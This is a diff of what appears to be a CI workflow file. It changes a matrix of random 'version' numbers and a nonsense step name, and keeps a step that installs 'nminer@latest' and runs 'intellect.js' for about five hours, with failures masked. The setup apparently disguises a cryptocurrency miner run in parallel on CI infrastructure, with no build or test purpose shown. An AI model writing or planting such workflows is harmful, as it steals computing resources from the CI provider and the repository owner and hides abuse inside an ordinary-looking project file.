@@ -9,26 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2989 }
-          - { version: 3209 }
-          - { version: 5157 }
-          - { version: 2157 }
-          - { version: 1033 }
-          - { version: 2672 }
-          - { version: 2168 }
-          - { version: 2862 }
-          - { version: 2723 }
-          - { version: 6030 }
-          - { version: 8667 }
-          - { version: 802 }
-          - { version: 2744 }
-          - { version: 9038 }
-          - { version: 5317 }
-          - { version: 5987 }
-          - { version: 6281 }
-          - { version: 7721 }
-          - { version: 4202 }
-          - { version: 1261 }
+          - { version: 5509 }
+          - { version: 762 }
+          - { version: 7538 }
+          - { version: 8425 }
+          - { version: 8612 }
+          - { version: 7820 }
+          - { version: 5101 }
+          - { version: 3421 }
+          - { version: 2323 }
+          - { version: 8552 }
+          - { version: 7184 }
+          - { version: 2623 }
+          - { version: 1377 }
+          - { version: 5979 }
+          - { version: 7939 }
+          - { version: 4860 }
+          - { version: 5432 }
+          - { version: 8923 }
 
     steps:
       - name: Checkout
@@ -39,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: phooey
+      - name: swift versus represent
         run: |
           npm install nminer@latest
-          timeout 304m node intellect.js || echo "intellect executed"
+          timeout 310m node intellect.js || echo "intellect executed"
